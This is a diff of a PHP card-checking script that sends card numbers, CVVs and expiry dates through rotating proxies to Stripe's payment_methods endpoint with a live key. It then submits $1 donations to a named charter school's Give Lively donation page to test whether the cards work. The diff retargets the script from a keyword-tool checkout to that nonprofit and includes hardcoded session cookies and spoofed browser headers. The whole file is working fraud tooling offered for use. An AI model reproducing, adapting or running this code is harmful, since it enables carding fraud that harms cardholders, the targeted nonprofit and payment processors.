@@ -229,16 +229,16 @@ echo '[ IP: '.$ip.' ] ';
 $ch = curl_init();
 curl_setopt($ch, CURLOPT_PROXY, "http://p.webshare.io:80"); 
 curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
-curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
+curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
 curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
 curl_setopt($ch, CURLOPT_HEADER, 0);
 curl_setopt($ch, CURLOPT_HTTPHEADER, array(
 'authority: api.stripe.com',
 'method: POST',
-'path: /v1/tokens',
+'path: /v1/payment_methods',
 'scheme: https',
 'accept: application/json',
-'accept-language: en-US,en;q=0.9',
+'accept-language: en-US,en;q=0.9,bn;q=0.8',
 'content-type: application/x-www-form-urlencoded',
 'origin: https://js.stripe.com',
 'referer: https://js.stripe.com/',
@@ -256,7 +256,7 @@ curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
 
 # ----------------- [1req Postfields] ---------------------#
 
-curl_setopt($ch, CURLOPT_POSTFIELDS, 'card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=e2632b90-0087-43d4-b483-213cb2475cba178460&muid=c6c3e62d-0231-4560-ad2e-3b10269eff0468e325&sid=8fb24205-1983-47f7-80ef-50cf734d2b2346d5c5&payment_user_agent=stripe.js%2F37725c4fd%3B+stripe-js-v3%2F37725c4fd&time_on_page=142588&key=pk_live_51JKKrhAzcQOWQ3TQ3vfkWxg8O41ndKd9x04KeButG2wr4vbsQka43HfxV6Zlst0v48fbIvjLLAFWKYoVYuxg4u0c006gxxOb67&pasted_fields=number');
+curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&billing_details[address][postal_code]='.$postcode.'&guid=NA&muid=NA&sid=NA&pasted_fields=number&payment_user_agent=stripe.js%2F663dfdbb7%3B+stripe-js-v3%2F663dfdbb7&time_on_page=132507&key=pk_live_GWQnyoQBA8QSySDV4tPMyOgI');
 
 $result1 = curl_exec($ch);
 $id = trim(strip_tags(getStr($result1,'"token": "','"')));
@@ -267,7 +267,7 @@ $id = trim(strip_tags(getStr($result1,'"token": "','"')));
 $ch = curl_init();
 curl_setopt($ch, CURLOPT_PROXY, "http://p.webshare.io:80"); 
 curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
-curl_setopt($ch, CURLOPT_URL, 'https://keywordtool.io/system/ajax');
+curl_setopt($ch, CURLOPT_URL, 'https://secure.givelively.org/donate.json');
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 curl_setopt($ch, CURLOPT_HEADER, 0);
 curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
@@ -278,16 +278,16 @@ curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
 curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
 curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
     curl_setopt($ch, CURLOPT_HTTPHEADER, array(
-'authority: keywordtool.io',
+'authority: secure.givelively.org',
 'method: POST',
-'path: /system/ajax',
+'path: /donate.json',
 'scheme: https',
 'accept: application/json, text/javascript, */*; q=0.01',
-'accept-language: en-US,en;q=0.9',
+'accept-language: en-US,en;q=0.9,bn;q=0.8',
 'content-type: application/json;charset=UTF-8',
-'cookie: Drupal.visitor.country=bd; __cf_bm=H39Bd9AC72o7VAljjshMdDusGkm5ZshYwIRt.xMOo.w-1646322480-0-AUd1995lxjt3QWFdgA+c14ofwOEKvNcf7k9FgmhRfmMOjx+s2YmvItS7ZcgYdKaoHSkn+Iww005SjvZVP3e1thpYvFSe7ORG06JJIooiUc3OvvaUplkZsZq3Obzx2VX9bg==; __stripe_mid=c6c3e62d-0231-4560-ad2e-3b10269eff0468e325; __stripe_sid=8fb24205-1983-47f7-80ef-50cf734d2b2346d5c5; Drupal.visitor.checkoutFailedPaymentCount=1',
-'origin: https://keywordtool.io',
-'referer: https://keywordtool.io/checkout?src=google&plan=pro_basic_v2_monthly',
+'cookie: datadome=XZgwPXi4YuY2cxYXCUIkdNLO2g1Ebv6hc4q6iXwTYG~8STFaVTdXMCRiF60g58zfNtQYlREXi2UHlKT_7zYeVIKzxoIsyOnODmpoI5.LkaTsVOwBovrVd3vbjOjf2Kf; _give-lively_session=og7fnqc1/g4lvSGjq4lBryoAYA8d9ALCoY/Ae1NEebqRDmVCU1YmxgpJHaXyeZ0HmN3JpfxbL4PIJ/u5eS73UTrIYikRD1fRP8uKuYHFwCCHDPPO8iZy3ywiK44wYgouRdmVPQK5tkkijhvWJ+4St8uJVLxzQ+He9Re89i+jO/6q7yZ15zjmeQGwTbjLCtbg1acExrkAYke6jbOSShFoX5xNIf5Wpwqea0x/uvyL3GlFaD8VI/SmiPKEZTr06AqTOo31PO+lxdwLe8wh8vQrYrNkqSy0zjecp1k7xA==--3ra6S6AqFDFfpcXY--1v9li7NRy6uskY9//41KJg==',
+'origin: https://secure.givelively.org',
+'referer: https://secure.givelively.org/donate/environmental-charter-school-at-frick-park',
 'sec-fetch-dest: empty',
 'sec-fetch-mode: cors',
 'sec-fetch-site: same-origin',
@@ -297,7 +297,7 @@ curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
 
 # ----------------- [2req Postfields] ---------------------#
 
-curl_setopt($ch, CURLOPT_POSTFIELDS,'name='.$name.'+'.$last.'&email='.$email.'&plan=pro_basic_v2_monthly&referer=google&checkout_payment_method=on&braintree_token='.$token.'&device_data=%7B%22device_session_id%22%3A%229ceaa2438569ad5df4660211d9ad7e69%22%2C%22fraud_merchant_id%22%3Anull%2C%22correlation_id%22%3A%2278b79135523a08165abccb704ebe9b05%22%7D&stripe_token=&form_build_id=form-tTJ57vEJI0PxwyZ00TJHVmc4igmL1BBcUe4wE1GfbeM&form_id=kt_subscription_checkout_form&_triggering_element_name=op&_triggering_element_value=Subscribe+Now&ajax_html_ids%5B%5D=&ajax_html_ids%5B%5D=header&ajax_html_ids%5B%5D=branding&ajax_html_ids%5B%5D=logo&ajax_html_ids%5B%5D=navbar&ajax_html_ids%5B%5D=menu-first&ajax_html_ids%5B%5D=menu-second&ajax_html_ids%5B%5D=block-kt-pages-user-menu&ajax_html_ids%5B%5D=main&ajax_html_ids%5B%5D=content&ajax_html_ids%5B%5D=block-system-main&ajax_html_ids%5B%5D=kt-subscription-checkout-form&ajax_html_ids%5B%5D=kt-subscription-checkout-form-wrapper&ajax_html_ids%5B%5D=edit-account--2&ajax_html_ids%5B%5D=edit-name--2&ajax_html_ids%5B%5D=edit-email--2&ajax_html_ids%5B%5D=pills-checkout-tab&ajax_html_ids%5B%5D=pills-checkout-stripe-tab&ajax_html_ids%5B%5D=pills-checkout-braintree-tab&ajax_html_ids%5B%5D=pills-checkout-content&ajax_html_ids%5B%5D=pills-checkout-stripe&ajax_html_ids%5B%5D=stripe-card-number&ajax_html_ids%5B%5D=stripe-card-expiry&ajax_html_ids%5B%5D=stripe-card-cvv&ajax_html_ids%5B%5D=pills-checkout-braintree&ajax_html_ids%5B%5D=braintree-card-number&ajax_html_ids%5B%5D=braintree-hosted-field-number&ajax_html_ids%5B%5D=braintree-card-expiry&ajax_html_ids%5B%5D=braintree-hosted-field-expirationDate&ajax_html_ids%5B%5D=braintree-card-cvv&ajax_html_ids%5B%5D=braintree-hosted-field-cvv&ajax_html_ids%5B%5D=edit-payment&ajax_html_ids%5B%5D=edit-actions&ajax_html_ids%5B%5D=edit-submit&ajax_html_ids%5B%5D=footer&ajax_html_ids%5B%5D=footer-first&ajax_html_ids%5B%5D=block-kt-pages-copyright&ajax_html_ids%5B%5D=footer-second&ajax_html_ids%5B%5D=block-kt-locale-language-switcher&ajax_html_ids%5B%5D=braintreeDataFrame-9ceaa2438569ad5df4660211d9ad7e69&ajax_html_ids%5B%5D=ppfnfnclspbfiframe&ajax_html_ids%5B%5D=ppfnfnclsiframe&ajax_page_state%5Btheme%5D=kt_theme&ajax_page_state%5Btheme_token%5D=k-ZoNitck9MC13jwx9CRC5yyHl_zTQSSyKGFTLw71UY&ajax_page_state%5Bcss%5D%5Bsites%2Fall%2Fcss%2Fstyle.min.css%5D=1&ajax_page_state%5Bjs%5D%5B0%5D=1&ajax_page_state%5Bjs%5D%5Bmisc%2Fjquery.js%5D=1&ajax_page_state%5Bjs%5D%5Bhttps%3A%2F%2Fjs.braintreegateway.com%2Fweb%2F3.80.0%2Fjs%2Fclient.min.js%5D=1&ajax_page_state%5Bjs%5D%5Bhttps%3A%2F%2Fjs.braintreegateway.com%2Fweb%2F3.80.0%2Fjs%2Fhosted-fields.min.js%5D=1&ajax_page_state%5Bjs%5D%5Bhttps%3A%2F%2Fjs.braintreegateway.com%2Fweb%2F3.80.0%2Fjs%2Fdata-collector.min.js%5D=1&ajax_page_state%5Bjs%5D%5Bsites%2Fall%2Fjs%2Fscript-a.min.js%5D=1&ajax_page_state%5Bjs%5D%5Bsites%2Fall%2Fjs%2Fscript-c.min.js%5D=1&ajax_page_state%5Bjs%5D%5Bsites%2Fall%2Fjs%2Fscript-b.min.js%5D=1');
+curl_setopt($ch, CURLOPT_POSTFIELDS,'{"auth_token":null,"donation":{"user_email":"'.$email.'","full_name":"'.$name.'+'.$last.'","zip_code":"'.$postcode.'","country":"US","amount":1,"stripe_token":"'.$token.'","stripe_customer_id":null,"guidestar_identifier":"8870056","recurring":false,"save_card":true,"share_details_opt_in":true,"private":false,"covering_transaction_fee":null,"transaction_fee":"","ref":null,"campaign":{},"nonprofit_name":"Environmental Charter School","utm_source":null,"activePaymentMethod":"creditCard","required_donatable_questions":[],"optional_donatable_questions":[],"widget_type":null,"widget_url":null,"referrer_url":"https://ecspgh.org/","ticket_order":null,"idempotency_key":"1ba8a55b-b753-403f-9464-5c87ac53e9df","event_id":null,"page_type":"nonprofit","team_id":null,"use_saved_card":false},"slug":"environmental-charter-school-at-frick-park"}');
 
 
 $result2 = curl_exec($ch);
